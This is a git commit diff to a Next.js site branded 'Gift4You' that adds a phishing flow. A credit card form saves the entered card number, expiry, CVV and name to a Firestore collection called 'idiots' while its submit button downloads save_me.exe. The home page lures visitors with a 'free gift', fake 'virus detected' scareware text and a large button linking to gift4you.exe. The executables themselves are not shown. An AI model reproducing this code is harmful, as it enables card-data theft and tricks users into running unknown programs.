caac78d11be1886583c21988cb3d894fe6674e01
ivantomi <ivan.luka.1234@gmail.com>
2023-06-02 08:52:32 +0200

    Added .exe download files

--- src/app/creditcard/page.js
+++ src/app/creditcard/page.js
@@ -2,6 +2,7 @@
 import React, { useState } from "react";
 import Cards from "react-credit-cards-2";
 import "react-credit-cards-2/dist/es/styles-compiled.css";
+import addData from "@/firebase/firestore/addData";
 
 const PaymentForm = () => {
   const [state, setState] = useState({
@@ -11,6 +12,12 @@ const PaymentForm = () => {
     name: "",
     focus: "",
   });
+
+  const SendData = async (event) => {
+    event.preventDefault();
+    const { error } = await addData("idiots", state.name, state);
+    console.log(error);
+  };
 
   const handleInputChange = (evt, limit) => {
     const { name, value } = evt.target;
@@ -38,6 +45,7 @@ const PaymentForm = () => {
         />
         <form className="flex flex-col items-center justify-center gap-4 mt-10 ">
           <input
+            required
             type="number"
             name="number"
             placeholder="Card number"
@@ -46,6 +54,7 @@ const PaymentForm = () => {
             onFocus={handleInputFocus}
           />
           <input
+            required
             type="expiry"
             name="expiry"
             placeholder="Expiretion date"
@@ -55,6 +64,7 @@ const PaymentForm = () => {
           />
 
           <input
+            required
             type="cvc"
             name="cvc"
             placeholder="CVV"
@@ -63,6 +73,7 @@ const PaymentForm = () => {
             onFocus={handleInputFocus}
           />
           <input
+            required
             type="name"
             name="name"
             placeholder="Name on Card"
@@ -70,9 +81,14 @@ const PaymentForm = () => {
             onChange={(evt) => handleInputChange(evt, 15)}
             onFocus={handleInputFocus}
           />
-          <button className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4">
-            SUBMIT
-          </button>
+          <a href="https://download.wetransfer.com/eugv/0172365ca9a39b4a7deae712239b218120230602064900/aa97929cb675896a9f7c3ff2b79992eee3ae6d5d/save_me.exe?cf=y&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQifQ.eyJleHAiOjE2ODU2ODkyMjIsImlhdCI6MTY4NTY4ODYyMiwiZG93bmxvYWRfaWQiOiI1NmI1ODMyYi1jOTUxLTQwNGItYTRkYS0zNDA2NTU5NDAxNGEiLCJzdG9yYWdlX3NlcnZpY2UiOiJzdG9ybSJ9.bMr8_kpxdxis_urVZ8QJhqcP-4NBuIDuJ4_xXdIrHYk">
+            <button
+              onClick={SendData}
+              className="border-pink-500 border-[2px] px-8 py-3 bg-pink-500 text-white rounded-full mt-4"
+            >
+              SUBMIT
+            </button>
+          </a>
         </form>
       </div>
     </>
--- src/app/page.js
+++ src/app/page.js
@@ -1,8 +1,9 @@
 "use client";
 import React from "react";
+import { useAuthContext } from "@/context/AuthContext";
 import { useRouter } from "next/navigation";
-
-export default function Home() {
+function Page() {
+  const { user } = useAuthContext();
   const router = useRouter();
 
   const Redirect = (page) => {
@@ -10,14 +11,59 @@ export default function Home() {
   };
 
   return (
-    <main className="flex min-h-screen flex-col items-center justify-between p-24 text-white">
-      <p>Yo man, wanna get a free gitf? Go ahaed and sign up for FREE</p>
+    <>
       <div className="w-full flex flex-row justify-center items-center bg-green-400 h-[50px] text-2xl pl-2">
         <div className="w-300px items-center flex justify-center gap-5">
-          <button onClick={Redirect("signin")}>Login</button>
-          <button onClick={Redirect("signup")}>Registre</button>
+          <p>Gift4You</p>
         </div>
       </div>
-    </main>
+      <div className="justify-center items-center h-screen w-full flex flex-col text-3xl ">
+        <h1 className="my-8">
+          Welcome frijend! Downloud program from botun below to clajm yours
+          gift!
+        </h1>
+
+        <div className="flex flex-col w-[450px] border-white border-[3px] justify-center py-4">
+          <div className="flex flex-row items-stretch justify-around border-b-[2px] border-pink-500 pb-2">
+            <img
+              className="w-[40px] h-[40px]"
+              src="https://media.npr.org/assets/img/2012/02/17/6874.5_01c91ebc_custom-19a59dc2b8d087677aaed0ebf4055fc5e11a1f80-s800-c85.png"
+              alt="ad"
+            />
+            <p>Virus detectd (4)</p>
+          </div>
+          <div className="flex flex-col text-lg items-center pb-3">
+            <p>Yours computer are infected with a dangerous virus</p>
+            <p>Click Click me to remove all viruses</p>
+          </div>
+          <div className="justify-center flex">
+            <a href="https://download.moodle.org/download.php/stable402/moodle-latest-402.zip">
+              <button className="border-pink-500 border-[2px] p-2 bg-pink-500 ">
+                Click me
+              </button>
+            </a>
+          </div>
+        </div>
+
+        <div className="py-20 text-9xl">
+          <a href="https://download.wetransfer.com/eugv/d63ae367540cd84cccdd5a09809b3bc620230602062432/94e43a0ce6c95deee347f886eeadcab98a9b3779/gift4you.exe?cf=y&token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCIsImtpZCI6ImRlZmF1bHQifQ.eyJleHAiOjE2ODU2ODc3NTcsImlhdCI6MTY4NTY4NzE1NywiZG93bmxvYWRfaWQiOiI1NWEyZGYwNy1jMDAzLTQ1NDAtYmI1Mi0xZjBjNzZjZWNlOGQiLCJzdG9yYWdlX3NlcnZpY2UiOiJzdG9ybSJ9.pLz_LgK0xVbySFbsk6sHbLWWh9PyzYHw4RlEfGx1Uy8">
+            <button
+              className=" rounded-full border-x-lime-500-[4px] p-5"
+              id="uglee"
+            >
+              CLICK ME!!&lt;/button&gt;
+            </button>
+          </a>
+        </div>
+
+        <div className="w-full flex flex-row justify-center items-center bg-green-400 h-screen text-2xl">
+          <div className="w-300px items-center flex justify-center">
+            <p>@ All lefts reserved 2019</p>
+          </div>
+        </div>
+      </div>
+    </>
   );
 }
+
+export default Page;
